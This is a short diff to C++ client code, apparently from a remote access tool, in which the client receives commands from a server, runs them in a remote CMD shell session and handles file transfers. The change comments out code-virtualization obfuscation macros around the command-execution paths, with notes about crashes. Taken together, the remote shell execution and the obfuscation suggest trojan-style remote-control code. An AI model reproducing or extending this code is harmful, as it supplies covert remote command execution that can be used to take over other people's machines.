@@ -23,30 +23,28 @@ bool Client::ProcessPacketType(PacketType _PacketType) {
     if (!GetString(msg)) {
       return false;
     }
-    VL_VIRTUALIZATION_BEGIN;
+    /*VL_VIRTUALIZATION_BEGIN;*/
     SendString(General::processCommand(msg), PacketType::Instruction);
-    VL_VIRTUALIZATION_END;
+    /*VL_VIRTUALIZATION_END;*/
     break;
   }
 
   case PacketType::CMDCommand: {
-    // VL_VIRTUALIZATION_BEGIN; CRASH
+     /*VL_VIRTUALIZATION_BEGIN; */
     std::string msg;
     if (!GetString(msg))
       return false;
 
     if (CMD::cmdptr != NULL) {
-      VL_VIRTUALIZATION_BEGIN;
+      /*VL_VIRTUALIZATION_BEGIN; CRASHED HAS TO BE INSIDE THE Function*/
       CMD::cmdptr->writeCMD(msg); // MOST ANNOYING BUG: [FIXED]
-      VL_VIRTUALIZATION_END;
+      /*VL_VIRTUALIZATION_END;*/
       break;
     } else {
-      // VL_VIRTUALIZATION_BEGIN; NOT WORKING PROPERLY
       SendString("Initiate a CMD session first.", PacketType::Warning);
-      // VL_VIRTUALIZATION_END; NOT WORKING PROPERLY
       break;
     }
-    // VL_VIRTUALIZATION_END; CRASH
+     /*VL_VIRTUALIZATION_END; */
   }
 
   case PacketType::FileTransferByteBuffer: {
